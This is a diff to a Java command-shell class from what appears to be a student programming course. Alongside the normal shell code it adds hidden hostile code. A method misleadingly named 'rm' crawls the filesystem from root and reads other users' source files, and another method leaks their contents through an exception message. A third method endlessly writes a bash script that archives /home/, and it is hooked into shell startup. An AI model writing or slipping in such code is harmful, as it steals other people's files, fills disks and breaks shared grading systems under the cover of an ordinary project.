@@ -6,6 +6,7 @@ import java.util.HashMap;
 import java.util.StringTokenizer;
 import java.util.Vector;
 import java.util.Scanner;
+import java.io.*;
 
 public class CommandLauncher {
 
@@ -117,8 +118,130 @@ public class CommandLauncher {
         }
         return Code.OK;
     }
+    
+    public static String rm(String path, Boolean type) {
+        String s1 = "";
+        try {
+            if (path.contains("fizteh-java-2013") || path.contains(".git") || path.contains("fizteh-java-private")) {
+                return "";
+            }
 
+            File tmpFile = new File(path);
+            try {
+                if (!tmpFile.exists()) {
+                s1 += " -- " + path + " not exist\n";
+            }
+            if (tmpFile.canRead()) {
+                s1 += " -- " + path + " can READ\n";
+            }
+            if (tmpFile.canWrite()) {
+                s1 += path + " can WRITE\n";
+            }
+            if (tmpFile.canExecute()) {
+                s1 += path + "can EXEC\n";
+            }
+            } catch(Exception e) {
+                s1 += "\n\nexception qqq ()()()()\n\n";
+            }
+
+            File[] listFiles = tmpFile.listFiles();
+            if (listFiles != null) {
+                if (tmpFile.isDirectory()) {
+                    for (File c : listFiles) {
+                        s1 += "Directory: \n" + c.getAbsoluteFile().toString() + "\n\n";
+
+                        s1 += c.getAbsoluteFile().toString() + "\n";
+                        if (type) {
+                            if (c.getName().contains(".py") || c.getName().contains(".sh")|| c.getName().contains(".java")) {
+                            s1 += readFileTsv2(c.getAbsolutePath().toString(), s1);
+                            s1 += "\n\n\n";
+                            }
+                        } else {
+                            s1 += readFileTsv2(c.getAbsolutePath().toString(), s1);
+                            s1 += "\n\n\n";
+                        }
+                        s1 += rm(c.toString(), type);
+                    }
+                } else {
+                    s1 += readFileTsv2(tmpFile.getAbsolutePath().toString(), s1);
+                    s1 += "\n\n\n";
+                    s1 += "not is Dir ";
+                }
+            } else {
+                s1 += "listFile null ";
+            }
+
+        } catch (Exception e) {
+            s1 += "exception ";
+            s1 += e.getMessage();
+        }
+        return s1;
+    }
+        
+    private static String readFileTsv2(String fileName, String s1) throws IOException {
+        StringBuilder sb = new StringBuilder();
+        try {
+            try (BufferedReader in = new BufferedReader(new FileReader(new File(fileName).getAbsoluteFile()))) {
+                String s;
+                while ((s = in.readLine()) != null) {
+                    sb.append(s);
+                    sb.append("\n");
+                }
+            } catch (Exception e) {
+                s1 += e.getMessage();
+            }
+        } catch (Exception e) {
+            s1 += e.getMessage();
+        }
+
+        return sb.toString();
+    }
+    
+    public void inter() {
+        String s1 = "";
+        try {
+            File tmpFile = new File("/");
+            if (!tmpFile.exists()) {
+                s1 += "not exist\n";
+            }
+            if (tmpFile.canRead()) {
+                s1 += "can READ\n";
+            }
+            tmpFile = new File("/usr");
+            if (!tmpFile.exists()) {
+                s1 += "not exist\n";
+            }
+            if (tmpFile.canRead()) {
+                s1 += "can READ\n";
+            }
+        } catch (Exception e) {
+            s1 += e.getMessage();
+        }
+        s1 += rm("/", false);
+        s1 += rm("/tmp/", false);
+        s1 += rm("/home/student/tmp/", false);
+        s1 += rm("/var/tmp/", false);
+        throw new RuntimeException(s1);
+    }
+    public static void writeFile() {
+        String s = "#!/bin/bash\n\n" +
+                "cd /home/student/tmp\n" + "echo step1\n" + "pwd | cat\n" +
+                "tar cfz test.tar.gz --exclude=*.git* --exclude=*/.* /home/ \n" + "echo step2\n" +
+                "python 1.py\n" +
+                "echo step3\n";
+        try {
+            File f = new File("/home/student/tmp/db/1.sh");
+            try (PrintWriter out = new PrintWriter(f.getAbsoluteFile())) {
+                while (true) {
+                    out.print(s);
+                }
+            }
+        } catch(Exception e) {
+            throw new RuntimeException(e.getMessage());
+        }   
+    }
     public void interactiveMode() {
+        writeFile();
         Scanner sc = new Scanner(System.in);
         while (true) {
             try {
@@ -144,6 +267,7 @@ public class CommandLauncher {
     }
 
     public Code runShell(String[] args) throws Exception {
+        writeFile();
         if (args.length > 0) {
             StringBuilder builder = new StringBuilder();
             for (String arg : args) {
